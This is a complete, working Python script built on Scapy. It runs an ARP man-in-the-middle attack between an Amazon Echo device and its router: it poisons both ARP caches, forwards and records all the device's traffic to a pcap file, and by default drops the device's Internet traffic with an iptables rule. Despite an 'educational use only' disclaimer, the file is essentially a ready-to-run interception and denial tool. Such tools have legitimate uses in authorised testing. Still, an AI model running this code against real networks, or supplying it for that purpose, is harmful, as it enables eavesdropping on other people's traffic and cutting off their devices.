#!/usr/bin/env python3
"""
Alexa ARP MITM – educational ARP man-in-the-middle tool
========================================================
Performs a classic ARP-cache-poisoning attack between an Amazon Echo (Alexa)
device and its default gateway so that all traffic passes through this host,
where it can be inspected (and optionally blocked).

FOR EDUCATIONAL / AUTHORISED USE ONLY.  Only run this on networks and
equipment that you own or have explicit written permission to test.

Usage
-----
    sudo python3 Alexa_ARP_MITM.py --alexa-ip 192.168.1.50 \\
                                    --gateway-ip 192.168.1.1 \\
                                    --interface wlan0

Run ``python3 Alexa_ARP_MITM.py --help`` for the full option list.
"""
from __future__ import annotations

import argparse
import logging
import os
import signal
import sys
import types
import threading
import subprocess

import scapy.all as scapy

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Global stop event – set by the signal handler to let threads exit cleanly
# ---------------------------------------------------------------------------
_stop_event = threading.Event()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    """Parse and return command-line arguments."""
    parser = argparse.ArgumentParser(
        description="ARP MITM tool for Alexa / Echo devices (educational use only).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--alexa-ip", default="172.20.10.14",
        help="IP address of the target Alexa / Echo device.",
    )
    parser.add_argument(
        "--gateway-ip", default="172.20.10.1",
        help="IP address of the default gateway (router).",
    )
    parser.add_argument(
        "--interface", "-i", default="wlan0",
        help="Network interface to use for spoofing and sniffing.",
    )
    parser.add_argument(
        "--pcap", default="alexa_mitm.pcap",
        help="Output file for captured packets.",
    )
    parser.add_argument(
        "--no-drop", action="store_true",
        help="Skip the iptables rule that drops Alexa's Internet traffic.",
    )
    parser.add_argument(
        "--spoof-interval", type=float, default=2.0,
        metavar="SECONDS",
        help="Seconds between ARP spoof packets.",
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Enable debug-level logging.",
    )
    return parser.parse_args()


def require_sudo() -> None:
    """Exit with an error message if the script is not running as root."""
    if os.geteuid() != 0:
        log.error("This script must be run with sudo / as root.")
        sys.exit(1)


def enable_ip_forward() -> None:
    """Enable Linux kernel IP forwarding so intercepted packets are relayed."""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True,
            capture_output=True,
        )
        log.info("IP forwarding enabled.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not enable IP forwarding: %s", exc)


def disable_ip_forward() -> None:
    """Restore the kernel's IP forwarding to the off state."""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            check=True,
            capture_output=True,
        )
        log.info("IP forwarding restored to disabled.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not disable IP forwarding: %s", exc)


def get_mac(ip: str) -> str | None:
    """
    Resolve the MAC address for *ip* via ARP.

    Returns the MAC string on success, or ``None`` if the host did not reply.
    """
    log.debug("ARP-resolving %s …", ip)
    ans, _ = scapy.arping(ip, timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None


# ---------------------------------------------------------------------------
# ARP spoofing
# ---------------------------------------------------------------------------

def arp_spoof(victim_ip: str, victim_mac: str, spoof_ip: str) -> None:
    """
    Send a single gratuitous ARP reply that poisons *victim_ip*'s cache.

    The packet tells *victim_ip* that *spoof_ip* is reachable via **our**
    MAC address, routing its traffic through this machine.
    """
    pkt = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)


def arp_restore(target_ip: str, target_mac: str, source_ip: str, source_mac: str) -> None:
    """
    Send a corrective ARP reply to restore the true MAC→IP mapping.

    Call this during cleanup so the victim and gateway return to normal
    operation after the attack is stopped.
    """
    pkt = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(pkt, count=5, verbose=False)


def spoof_loop(
    alexa_ip: str,
    alexa_mac: str,
    gateway_ip: str,
    gateway_mac: str,
    interval: float,
) -> None:
    """
    Continuously send ARP spoof packets until *_stop_event* is set.

    Runs in a background daemon thread.  Poisons both the Alexa device
    (telling it this host is the gateway) and the gateway (telling it this
    host is the Alexa device).
    """
    log.debug("ARP spoof loop started (interval=%.1fs).", interval)
    while not _stop_event.is_set():
        arp_spoof(alexa_ip,   alexa_mac,   gateway_ip)
        arp_spoof(gateway_ip, gateway_mac, alexa_ip)
        _stop_event.wait(timeout=interval)
    log.debug("ARP spoof loop exited.")


# ---------------------------------------------------------------------------
# iptables helpers
# ---------------------------------------------------------------------------

def iptables_block_internet(alexa_ip: str, gateway_ip: str) -> None:
    """
    Add an iptables FORWARD rule that drops Alexa traffic destined for the
    Internet (i.e. anything outside the local /24 subnet).
    """
    cmd = [
        "iptables", "-A", "FORWARD",
        "-s", alexa_ip,
        "!", "-d", gateway_ip + "/24",
        "-j", "DROP",
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        log.info("iptables rule installed: Alexa Internet traffic will be dropped.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not install iptables rule: %s", exc)


def iptables_unblock_internet(alexa_ip: str, gateway_ip: str) -> None:
    """Remove the FORWARD DROP rule added by :func:`iptables_block_internet`."""
    cmd = [
        "iptables", "-D", "FORWARD",
        "-s", alexa_ip,
        "!", "-d", gateway_ip + "/24",
        "-j", "DROP",
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        log.info("iptables rule removed.")
    except subprocess.CalledProcessError as exc:
        log.warning("Could not remove iptables rule: %s", exc)


# ---------------------------------------------------------------------------
# Packet capture
# ---------------------------------------------------------------------------

def make_packet_handler(pcap_file: str):
    """Return a Scapy packet callback that appends each packet to *pcap_file*."""
    def _handler(pkt) -> None:
        scapy.wrpcap(pcap_file, pkt, append=True)
    return _handler


def sniff_traffic(interface: str, pcap_file: str) -> None:
    """
    Start Scapy's packet sniffer on *interface*.

    Captured packets are written to *pcap_file*.  The sniffer stops as soon
    as *_stop_event* is set (checked via the ``stop_filter`` callback).
    """
    log.info("Sniffing on %s – packets saved to '%s'.", interface, pcap_file)
    log.info("Press Ctrl+C to stop.")
    scapy.sniff(
        iface=interface,
        store=False,
        prn=make_packet_handler(pcap_file),
        stop_filter=lambda _pkt: _stop_event.is_set(),
    )


# ---------------------------------------------------------------------------
# Signal handling & cleanup
# ---------------------------------------------------------------------------

def _build_signal_handler(alexa_ip, alexa_mac, gateway_ip, gateway_mac, drop_internet):
    """Return a SIGINT/SIGTERM handler that performs graceful cleanup."""

    def _handler(signum: int, frame: types.FrameType | None) -> None:
        log.info("Caught signal %d – cleaning up…", signum)
        _stop_event.set()

        log.info("Restoring ARP caches…")
        arp_restore(alexa_ip,   alexa_mac,   gateway_ip, gateway_mac)
        arp_restore(gateway_ip, gateway_mac, alexa_ip,   alexa_mac)

        if drop_internet:
            iptables_unblock_internet(alexa_ip, gateway_ip)

        disable_ip_forward()
        log.info("Done. Exiting.")
        sys.exit(0)

    return _handler


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """Parse arguments, set up the attack, and hand off to the sniffer."""
    args = parse_args()

    if args.verbose:
        log.setLevel(logging.DEBUG)

    require_sudo()
    enable_ip_forward()

    log.info("Resolving MAC addresses…")
    alexa_mac   = get_mac(args.alexa_ip)
    gateway_mac = get_mac(args.gateway_ip)

    if not alexa_mac:
        log.error("Could not resolve MAC for Alexa (%s). Check the IP and connectivity.", args.alexa_ip)
        sys.exit(1)
    if not gateway_mac:
        log.error("Could not resolve MAC for gateway (%s). Check the IP and connectivity.", args.gateway_ip)
        sys.exit(1)

    log.info("Alexa   %s  →  %s", args.alexa_ip,   alexa_mac)
    log.info("Gateway %s  →  %s", args.gateway_ip, gateway_mac)

    drop_internet = not args.no_drop
    if drop_internet:
        log.info("Installing iptables rule to block Alexa's Internet traffic…")
        iptables_block_internet(args.alexa_ip, args.gateway_ip)

    # Register cleanup handler for Ctrl-C / SIGTERM
    handler = _build_signal_handler(
        args.alexa_ip, alexa_mac,
        args.gateway_ip, gateway_mac,
        drop_internet,
    )
    signal.signal(signal.SIGINT,  handler)
    signal.signal(signal.SIGTERM, handler)

    log.info("Starting ARP spoofing thread (interval=%.1fs)…", args.spoof_interval)
    spoof_thread = threading.Thread(
        target=spoof_loop,
        args=(args.alexa_ip, alexa_mac, args.gateway_ip, gateway_mac, args.spoof_interval),
        daemon=True,
    )
    spoof_thread.start()

    sniff_traffic(args.interface, args.pcap)


if __name__ == "__main__":
    main()
